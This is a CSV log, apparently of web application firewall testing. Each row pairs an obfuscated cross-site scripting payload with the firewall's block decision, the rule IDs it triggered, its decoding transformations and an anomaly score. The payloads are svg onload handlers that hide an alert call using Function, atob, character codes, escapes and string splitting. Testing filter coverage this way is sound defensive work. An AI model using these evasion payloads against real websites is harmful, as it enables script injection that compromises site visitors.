2221,"<svg onload=""(function(){window['a\x74ob']=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,132 || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,17v217,132t:urlDecodeUni,t:compressWhitespace || ",25,177603538525.890427
2222,"<svg onload=""(function(){window['ato\x62']=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,132 || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,17v217,132t:urlDecodeUni,t:compressWhitespace || ",25,177603538629.666068
2223,"<svg onload=""(function(){this.window['atob']=Function;this.window['atob'](String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o65,76v217,149t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,149 || v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,14v217,149t:urlDecodeUni,t:compressWhitespace || ",30,177603538712.799251
2224,"<svg onload=""(function(){(1,window)['atob']=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,112v217,133t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,133 || v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,15v217,133t:urlDecodeUni,t:compressWhitespace || ",30,177603538890.189140
2225,"<svg onload=""(function(){frames['atob']=Function;frames['atob'](String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o55,76v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603538956.544275
2227,"<svg onload=""(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603539213.554268
2228,"<svg onload=""(new Function('al\x65rt(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v216,46 || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603539313.225854
2229,"<svg onload=""(new Function('al\u0065rt(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v216,48 || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603539447.038053
2230,"<svg onload=""(new Function(['al','ert(1)'].join('')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,57 || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603539572.981032
2231,"<svg onload=""(new Function(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v216,53 || v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603539773.853387
2232,"<svg onload=""(new Function('al'+'ert'+'(1)'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v216,49 || o14,13v216,49t:urlDecodeUni || v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603539886.781076
2233,"<svg onload=""(new Function(`al`+`ert(1)`))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v216,46 || o14,13v216,46t:urlDecodeUni || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603539937.187205
2236,"<svg onload=""(new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29)))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603540217.451455
2237,"<svg onload=""(new Function('al'+String['fromCharCode'](101)+'rt(1)'))()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,58v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,73 || o14,13v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603540460.804098
2238,"<svg onload=""(new Function('a\154ert(1)'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v216,46 || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603540558.006483
2239,"<svg onload=""(new Function('al'.concat('ert(1)')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,54 || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603540675.985120
2241,"<svg onload=""(new Function('a'+'l'+'e'+'r'+'t'+'('+'1'+')'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,64 || o14,13v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603540875.515593
2242,"<svg onload=""(new Function(String.fromCodePoint(97,108,101,114,116,40,49,41)))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603540912.682507
2244,"<svg onload=""(new Function('al'+[String.fromCharCode(101),String.fromCharCode(114),String.fromCharCode(116)].join('')+'(1)'))()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o102,25v217,129t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,129 || o14,13v217,129t:urlDecodeUni || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603541212.363739
2245,"<svg onload=""(new Function(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41)))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,228 || o14,13v217,228t:urlDecodeUni || v217,228t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,228t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,228t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603541365.449040
2246,"<svg onload=""Function('al'+'ert(1)')()"">",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,40 || v216,40t:urlDecodeUni || ",25,177603541480.100309
2266,"<svg onload=""(new Function('return wind'+'ow\u002eal'+'ert'))()('XSS')"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,72 || o14,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603543944.966026
2267,"<svg onload=""(Function.constructor('return wind'+'ow\u002eal'+'ert'))()('XSS')"">",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603544151.313489
2268,"<svg onload=""(new Function('return self\u002eal'+'ert'))()('XSS')"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,67 || o14,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603544254.642717
2270,"<svg onload=""(new Function('return top\u002eal'+'ert'))()('XSS')"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,66 || o14,13v217,66t:urlDecodeUni || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603544553.293233
2271,"<svg onload=""(new Function('return parent\u002eal'+'ert'))()('XSS')"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,69 || o14,13v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603544620.244284
2273,"<svg onload=""(new Function('return globalThis\u002eal'+'ert'))()('XSS')"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,73 || o14,13v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603544851.140841
2274,"<svg onload=""(new Function('return this\u002eal'+'ert')).call(window)('XSS')"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o61,15v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o14,13v217,78 || o14,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760354509.547559
2286,"<svg onload=""Function(atob('YWxlcnQoJ1hTUycp'))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603546453.165428
2288,"<svg onload=""(function(){return Function(atob('YWxlcnQoJ1hTUycp'))()})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,59v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603546787.458325
2291,"<svg onload=""window['Function'](atob('YWxlcnQoJ1hTUycp'))()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,40v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,67t:urlDecodeUni,t:compressWhitespace || ",25,177603547010.426721
2299,"<svg onload=""globalThis['Function'](atob('YWxlcnQoJ1hTUycp'))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o23,40v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603548056.949457
2300,"<svg onload=""parent['Function'](atob('YWxlcnQoJ1hTUycp'))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o19,40v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603548191.973570
2301,"<svg/onload=""Function(atob('YWxlcnQoJ1hTUycp'))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603548238.853311
2305,"<svg onload=""(()=>Function(atob('YWxlcnQoJ1hTUycp'))())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o26,31v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603548753.878297
2308,"<svg onload=""window['Function']['constructor']('ale'+'rt(16)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,45v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,66t:urlDecodeUni,t:compressWhitespace || ",25,177603549164.625198
2310,"<svg onload=""Function.call(null,'ale'+'rt(16)')()"">",0,1,block,4,"941100,941120,941160,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760354937.402399
2312,"<svg onload=""(()=>{return Function})()('ale'+'rt(16)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603549594.376412
2313,"<svg onload=""Function``.constructor.constructor('ale'+'rt(16)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603549769.150288
2316,"<svg onload=""Function(String.fromCharCode(97,108,101,114,116,40,49,54,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760355018.400699
2317,"<svg onload=""self['Function']('ale'+'rt(16)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,30v216,49t:urlDecode,t:replaceComments,t:compressWhitespace || v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v216,49t:urlDecodeUni,t:compressWhitespace || ",25,177603550358.793615
2318,"<svg onload=""(1,Function)('ale'+'rt(16)')()"">",0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603550421.991125
2320,"<svg onload=""Function&#x28;'ale'+'rt(16)'&#x29;()"">",0,1,block,4,"941100,941120,941160,949110","v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603550689.235220
2323,"<svg onload=""Function.prototype.constructor('ale'+'rt(16)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603551080.386630
2324,"<svg onload=""(function(){return this})()['Function']('ale'+'rt(16)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,57v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,72 || o14,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603551137.463527
2325,"<svg onload=""(a=Function,'ale'+'rt(16)',a('ale'+'rt(16)')())"">",0,1,block,5,"933210,941100,941120,941160,949110","o41,19v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603551394.083753
2334,"<svg onload=""Function['call'](null,'return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,49v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603552460.628391
2337,"<svg onload=""Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603552722.294826
2338,"<svg onload=""window['Function']['prototype']['constructor']('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,76v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,97t:urlDecodeUni,t:compressWhitespace || ",25,177603552870.056033
